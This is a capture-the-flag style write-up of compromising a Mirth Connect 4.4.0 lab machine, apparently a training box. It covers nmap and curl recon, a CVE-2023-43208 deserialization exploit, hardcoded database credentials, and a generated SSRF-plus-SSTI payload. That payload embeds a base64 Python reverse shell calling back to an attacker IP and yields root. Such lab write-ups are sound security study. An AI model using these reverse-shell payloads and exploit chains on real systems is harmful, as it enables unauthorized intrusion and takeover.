![](Assets/Pasted%20image%2020260425141620.png)

**Main Vectors:** Insecure Deserialization (CVE-2023-43208), Local SSRF, Server-Side Template Injection (SSTI) to RCE.

---
## 1. Reconnaissance & Enumeration

Initial connectivity was verified via ICMP. We then proceeded with a comprehensive `nmap` scan to enumerate open ports and running services.

![](Assets/Pasted%20image%2020260425142258.png)

```bash
sudo nmap -sV -sC -sS --min-rate 500 10.129.45.119
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 14:16 -0600
Nmap scan report for 10.129.45.119
Host is up (0.080s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Jetty
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Navigating to port 80 reveals the web interface for NextGen Mirth Connect.

![](Assets/Pasted%20image%2020260427112302.png)

To identify the specific version running, we query the API directly. Initial attempts return a `400 Bad Request` stating the need for an `X-Requested-With` header.

```bash
curl -k -s https://10.129.47.6/api/server/version
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
<title>Error 400 All requests must have &apos;X-Requested-With&apos; header</title>
</head>
<body><h2>HTTP ERROR 400 All requests must have &apos;X-Requested-With&apos; header</h2>
<table>
<tr><th>URI:</th><td>/api/server/version</td></tr>
<tr><th>STATUS:</th><td>400</td></tr>
<tr><th>MESSAGE:</th><td>All requests must have &apos;X-Requested-With&apos; header</td></tr>
<tr><th>SERVLET:</th><td>org.glassfish.jersey.servlet.ServletContainer-2176ac82</td></tr>
</table>
</body>
</html>
```

By injecting the required header, we successfully extract the version:

```bash
curl -k -s -H "X-Requested-With: OpenAPI" https://10.129.47.6/api/server/version
# Output: 4.4.0
```

>[!info] Command Breakdown
> `-k` This is your local security bypass. You tell curl: "I know this site is dangerous, don't validate the certificate, just let me through."
> `-s`  Stealth mode. Normally curl prints you a progress bar, the download speed and the estimated time in the terminal. In Red Teaming, that only makes the screen dirty. The -s silences everything and gives you only what the server responds to.
> `-H "X-Requested-With: OpenAPI"`  The lockpick for the chainman. As you discovered before, the Mirth Connect API rejects requests that do not have this specific header (a classic measure to avoid CSRF attacks and simple bots). With -H, we force curl to inject that exact line into the HTTP request, tricking the server into processing our command.

## 2. Vulnerability Discovery & Exploitation

Researching **NextGen Mirth Connect version 4.4.0** reveals it is vulnerable to **CVE-2023-43208**, an aunauthenticated Remote Code Execution (RCE) flaw stemming from insecure handling of deserialized data. This vulnerability bypasses the initial patch of a previous CVE by exploiting the deserialization gadget chain.

>[!danger] Explotation Flow
> 1. Send crafted XML to /api/users endpoint.
> 2. Server deserializes malicious object.
> 3. Gadget chain is triggered.
> 4. `Runtime.exec()` executes our attacker-controlled command.
> 5. Reverse shell is obtained

We utilized an exploit script from [K3ysTr0K3R/CVE-2023-43208-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT). *(Note: Minor script adjustements were required, such as downgrading setuptools with* `pip install "setuptools<70.0.0"`).

After setting up a `netcat` listener, we fire the exploit:

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
python3 CVE-2023-43208.py -u https:<target-ip> -lh <machine-vpn-ip> -lp 4444
```

We catch the shell as the `mirth` user. We upgrade the shell to a fully interactive TTY.

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.47.6 57040
pwd
/usr/local/mirthconnect

python3 -c 'import pty; pty.spawn("/bin/bash")'
mirth@interpreter:/usr/local/mirthconnect$
```

## 3. Internal Enumeration & Database Access

Listing the installation directory (`/usr/local/mirthconnect/conf`), we inspect the `mirth.properties` file and uncover hardcode database credentials:

```Ini, TOML
database.username = mirthdb
database.password = MirthPass123!
```

Using these credential, we access the local MariaDB instance:
```bash
mysql -u mirthdb -p'MirthPass123!'
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mc_bdd_prod        |
+--------------------+

MariaDB [(none)]> use mc_bdd_prod
```

After switching to the `mc_bdd_prod` database and enumerating the tables, we focus our attention on the `CHANNEL` table.

> [!info]- Expand to view the CHANNEL Table Dump
> ```xml
> <channel version="4.4.0">
>   <id>24c915f9-d3e3-462a-a126-3511d3f3cd0a</id>
>   <nextMetaDataId>2</nextMetaDataId>
>   <name>INTERPRETER - HL7 TO XML TO NOTIFY</name>
>   <description></description>
>   <revision>5</revision>
>   <sourceConnector version="4.4.0">
> <metaDataId>0</metaDataId>
> <name>sourceConnector</name>
> <properties class="com.mirth.connect.connectors.tcp.TcpReceiverProperties" version="4.4.0">
>   <pluginProperties/>
>   <listenerConnectorProperties version="4.4.0">
>     <host>0.0.0.0</host>
>     <port>6661</port>
>   </listenerConnectorProperties>
>   <sourceConnectorProperties version="4.4.0">
>     <responseVariable>Auto-generate (After source transformer)</responseVariable>
>     <respondAfterProcessing>true</respondAfterProcessing>
>     <processBatch>false</processBatch>
>     <firstResponse>true</firstResponse>
>     <processingThreads>1</processingThreads>
>     <resourceIds class="linked-hash-map">
>       <entry>
>         <string>Default Resource</string>
>         <string>[Default Resource]</string>
>       </entry>
>     </resourceIds>
>     <queueBufferSize>1000</queueBufferSize>
>   </sourceConnectorProperties>
>   <transmissionModeProperties class="com.mirth.connect.plugins.mllpmode.MLLPModeProperties">
>     <pluginPointName>MLLP</pluginPointName>
>     <startOfMessageBytes>0B</startOfMessageBytes>
>     <endOfMessageBytes>1C0D</endOfMessageBytes>
>     <useMLLPv2>false</useMLLPv2>
>     <ackBytes>06</ackBytes>
>     <nackBytes>15</nackBytes>
>     <maxRetries>2</maxRetries>
>   </transmissionModeProperties>
>   <serverMode>true</serverMode>
>   <remoteAddress></remoteAddress>
>   <remotePort></remotePort>
>   <overrideLocalBinding>false</overrideLocalBinding>
>   <reconnectInterval>5000</reconnectInterval>
>   <receiveTimeout>0</receiveTimeout>
>   <bufferSize>65536</bufferSize>
>   <maxConnections>10</maxConnections>
>   <keepConnectionOpen>false</keepConnectionOpen>
>   <dataTypeBinary>false</dataTypeBinary>
>   <charsetEncoding>DEFAULT_ENCODING</charsetEncoding>
>   <respondOnNewConnection>0</respondOnNewConnection>
>   <responseAddress></responseAddress>
>   <responsePort></responsePort>
> </properties>
> <transformer version="4.4.0">
>   <elements>
>     <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
>       <name>TIMESTAMP</name>
>       <sequenceNumber>0</sequenceNumber>
>       <enabled>true</enabled>
>       <messageSegment>tmp[&apos;timestamp&apos;]</messageSegment>
>       <mapping>msg[&apos;MSH&apos;][&apos;MSH.7&apos;][&apos;MSH.7.1&apos;].toString()</mapping>
>       <defaultValue></defaultValue>
>       <replacements/>
>     </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
>     <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
>       <name>SENDER_APP</name>
>       <sequenceNumber>1</sequenceNumber>
>       <enabled>true</enabled>
>       <messageSegment>tmp[&apos;sender_app&apos;]</messageSegment>
>       <mapping>msg[&apos;MSH&apos;][&apos;MSH.3&apos;][&apos;MSH.3.1&apos;].toString()</mapping>
>       <defaultValue></defaultValue>
>       <replacements/>
>     </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
>     <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
>       <name>ID</name>
>       <sequenceNumber>2</sequenceNumber>
>       <enabled>true</enabled>
>       <messageSegment>tmp[&apos;id&apos;]</messageSegment>
>       <mapping>msg[&apos;PID&apos;][&apos;PID.3&apos;][&apos;PID.3.1&apos;].toString()</mapping>
>       <defaultValue></defaultValue>
>       <replacements/>
>     </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
>     <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
>       <name>FIRSTNAME</name>
>       <sequenceNumber>3</sequenceNumber>
>       <enabled>true</enabled>
>       <messageSegment>tmp[&apos;firstname&apos;]</messageSegment>
>       <mapping>msg[&apos;PID&apos;][&apos;PID.5&apos;][&apos;PID.5.2&apos;].toString()</mapping>
>       <defaultValue></defaultValue>
>       <replacements/>
>     </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
>     <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
>       <name>LASTNAME</name>
>       <sequenceNumber>4</sequenceNumber>
>       <enabled>true</enabled>
>       <messageSegment>tmp[&apos;lastname&apos;]</messageSegment>
>       <mapping>msg[&apos;PID&apos;][&apos;PID.5&apos;][&apos;PID.5.1&apos;].toString()</mapping>
>       <defaultValue></defaultValue>
>       <replacements/>
>     </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
>     <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
>       <name>BIRTH_DATE</name>
>       <sequenceNumber>5</sequenceNumber>
>       <enabled>true</enabled>
>       <messageSegment>tmp[&apos;birth_date&apos;]</messageSegment>
>       <mapping>date_conversion(msg[&apos;PID&apos;][&apos;PID.7&apos;][&apos;PID.7.1&apos;].toString())</mapping>
>       <defaultValue></defaultValue>
>       <replacements/>
>     </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
>     <com.mirth.connect.plugins.messagebuilder.MessageBuilderStep version="4.4.0">
>       <name>GENDER</name>
>       <sequenceNumber>6</sequenceNumber>
>       <enabled>true</enabled>
>       <messageSegment>tmp[&apos;gender&apos;]</messageSegment>
>       <mapping>msg[&apos;PID&apos;][&apos;PID.8&apos;][&apos;PID.8.1&apos;].toString()</mapping>
>       <defaultValue></defaultValue>
>       <replacements/>
>     </com.mirth.connect.plugins.messagebuilder.MessageBuilderStep>
>   </elements>
>   <inboundTemplate encoding="base64">TVNIfF5+XFwmfFdFQkFQUHxJTlRFUlBSRVRFUnxNSVJUSHxJTlRFUlBSRVRFUnxUSU1FU1RBTVB8fEFEVF5BMDF8fFB8Mi41ClBJRHwxfHxQQVRJRU5USUReXl5JTlRFUlBSRVRFUnx8TEFTVE5BTUVeRklSU1ROQU1FfHxEQVRFT0ZCSVJUSHxHRU5ERVI=</inboundTemplate>
>   <outboundTemplate encoding="base64">PHBhdGllbnQ+CiAgPHRpbWVzdGFtcD48L3RpbWVzdGFtcD4KICA8c2VuZGVyX2FwcD48L3NlbmRlcl9hcHA+CiAgPGlkPjwvaWQ+CiAgPGZpcnN0bmFtZT48L2ZpcnN0bmFtZT4KICA8bGFzdG5hbWU+PC9sYXN0bmFtZT4KICA8YmlydGhfZGF0ZT48L2JpcnRoX2RhdGU+CiAgPGdlbmRlcj48L2dlbmRlcj4KPC9wYXRpZW50Pg==</outboundTemplate>
>   <inboundDataType>HL7V2</inboundDataType>
>   <outboundDataType>XML</outboundDataType>
>   <inboundProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2DataTypeProperties" version="4.4.0">
>     <serializationProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2SerializationProperties" version="4.4.0">
>       <handleRepetitions>true</handleRepetitions>
>       <handleSubcomponents>true</handleSubcomponents>
>       <useStrictParser>false</useStrictParser>
>       <useStrictValidation>false</useStrictValidation>
>       <stripNamespaces>false</stripNamespaces>
>       <segmentDelimiter>\r</segmentDelimiter>
>       <convertLineBreaks>true</convertLineBreaks>
>     </serializationProperties>
>     <deserializationProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2DeserializationProperties" version="4.4.0">
>       <useStrictParser>false</useStrictParser>
>       <useStrictValidation>false</useStrictValidation>
>       <segmentDelimiter>\r</segmentDelimiter>
>     </deserializationProperties>
>     <batchProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2BatchProperties" version="4.4.0">
>       <splitType>MSH_Segment</splitType>
>       <batchScript></batchScript>
>     </batchProperties>
>     <responseGenerationProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2ResponseGenerationProperties" version="4.4.0">
>       <segmentDelimiter>\r</segmentDelimiter>
>       <successfulACKCode>AA</successfulACKCode>
>       <successfulACKMessage></successfulACKMessage>
>       <errorACKCode>AE</errorACKCode>
>       <errorACKMessage>An Error Occurred Processing Message.</errorACKMessage>
>       <rejectedACKCode>AR</rejectedACKCode>
>       <rejectedACKMessage>Message Rejected.</rejectedACKMessage>
>       <msh15ACKAccept>false</msh15ACKAccept>
>       <dateFormat>yyyyMMddHHmmss.SSS</dateFormat>
>     </responseGenerationProperties>
>     <responseValidationProperties class="com.mirth.connect.plugins.datatypes.hl7v2.HL7v2ResponseValidationProperties" version="4.4.0">
>       <successfulACKCode>AA,CA</successfulACKCode>
>       <errorACKCode>AE,CE</errorACKCode>
>       <rejectedACKCode>AR,CR</rejectedACKCode>
>       <validateMessageControlId>true</validateMessageControlId>
>       <originalMessageControlId>Destination_Encoded</originalMessageControlId>
>       <originalIdMapVariable></originalIdMapVariable>
>     </responseValidationProperties>
>   </inboundProperties>
>   <outboundProperties class="com.mirth.connect.plugins.datatypes.xml.XMLDataTypeProperties" version="4.4.0">
>     <serializationProperties class="com.mirth.connect.plugins.datatypes.xml.XMLSerializationProperties" version="4.4.0">
>       <stripNamespaces>false</stripNamespaces>
>     </serializationProperties>
>     <batchProperties class="com.mirth.connect.plugins.datatypes.xml.XMLBatchProperties" version="4.4.0">
>       <splitType>Element_Name</splitType>
>       <elementName></elementName>
>       <level>1</level>
>       <query></query>
>       <batchScript></batchScript>
>     </batchProperties>
>   </outboundProperties>
> </transformer>
> <filter version="4.4.0">
>   <elements/>
> </filter>
> <transportName>TCP Listener</transportName>
> <mode>SOURCE</mode>
> <enabled>true</enabled>
> <waitForPrevious>true</waitForPrevious>
> 
>   
>   
>     
>       1
>       Destination 1
>       
>         
>         
>           false
>           false
>           10000
>           false
>           0
>           false
>           false
>           1
>           
>           false
>           
>             
>               Default Resource
>               [Default Resource]
>             
>           
>           1000
>           true
>         
>         [http://127.0.0.1:54321/addPatient](http://127.0.0.1:54321/addPatient)
>         false
>         
>         
>         post
>         
>         
>         false
>         
>         false
>         
>         false
>         true
>         false
>         application/.*(?<!json|xml)$|image/.*|video/.*|audio/.*
>         true
>         false
>         false
>         Basic
>         false
>         
>         
>         ${message.encodedData}
>         text/plain
>         false
>         UTF-8
>         30000
>       
>       
>         
>         
>         
>         XML
>         XML
>         
>           
>             false
>           
>           
>             Element_Name
>             
>             1
>             
>             
>           
>         
>         
>           
>             false
>           
>           
>             Element_Name
>             
>             1
>             
>             
>           
>         
>       
>       
>         
>         XML
>         XML
>         
>           
>             false
>           
>           
>             Element_Name
>             
>             1
>             
>             
>           
>         
>         
>           
>             false
>           
>           
>             Element_Name
>             
>             1
>             
>             
>           
>         
>       
>       
>         
>       
>       HTTP Sender
>       DESTINATION
>       true
>       true
>     
>   
>   // Modify the message variable below to pre process data
> return message;
>   // This script executes once after a message has been processed
> // Responses returned from here will be stored as "Postprocessor" in the response map
> return;
>   // This script executes once when the channel is deployed
> // You only have access to the globalMap and globalChannelMap here to persist data
> return;
>   // This script executes once when the channel is undeployed
> // You only have access to the globalMap and globalChannelMap here to persist data
> return;
>   
>     true
>     DISABLED
>     false
>     false
>     false
>     false
>     false
>     false
>     STARTED
>     false
>     
>       
>         SOURCE
>         STRING
>         mirth_source
>       
>       
>         TYPE
>         STRING
>         mirth_type
>       
>     
>     
>       None
>       
>     
>     
>       
>         Default Resource
>         [Default Resource]
>       
>     
>   
> ```

Analyzing the extracted table data reveals a hidden backend service processing patient information via a local API endpoint: `http://127.0.0.1:54321/addPatient`.

## 4. Privilege Escalation (Root)

To compromise this internal service, we mapped out a local SSRF chained with a Server-Side Template Injection (SSTI). We developed a custom payload generator script (`generate_payload.py`) to automate the attack.

>[!warning] Local SSRF to RCE Execution Chain
> 1. Payload Generation: A standard Python reverse shell is crafted.
> 2. Filter Evasion: The payload is Base64 encoded to bypass XML formatting restrictions and special character filtering.
> 3. SSTI Trigger: The Base64 string is embedded within the `<firstname>` XML tag using template syntax `{{exec(...)}}`. This forces the vulnerable backend to decode and execute the shell directly in system memory.
> 4. Local Delivery: A python one-liner is generated. Running this on our compromised `mirth` session triggers an internal POST request to the local port `54321`, delivering the malicious XML and bypassing the external firewall.

We execute our generator script locally:

```bash
python generate_payload.py
--- Reverse Shell Payload Generator ---
Input Target IP: 10.10.14.97
Input Target Port: 5555

==================================================
Generated Payload:
==================================================
python3 -c 'import urllib.request; b64="aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuOTciLDU1NTUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIp"; inj="{exec(__import__(\"base64\").b64decode(\"aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuOTciLDU1NTUpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIp\").decode())}"; xml="<patient><firstname>"+inj+"</firstname><lastname>Doe</lastname><timestamp>2026</timestamp><sender_app>P</sender_app><id>1</id><birth_date>01/01/1990</birth_date><gender>M</gender></patient>"; req=urllib.request.Request("http://127.0.0.1:54321/addPatient",data=xml.encode(),headers={"Content-Type":"application/xml"}); urllib.request.urlopen(req)'
==================================================
```

After setting up a new listener (`nc -lvnp 5555`), we execute the generated payload on the victim machine.

```bash
nc -lvnp 5555
Listening on 0.0.0.0 5555
Connection received on 10.129.47.6 46756
root@interpreter:/usr/local/bin# whoami
whoami
root
```

Full system compromise achieved.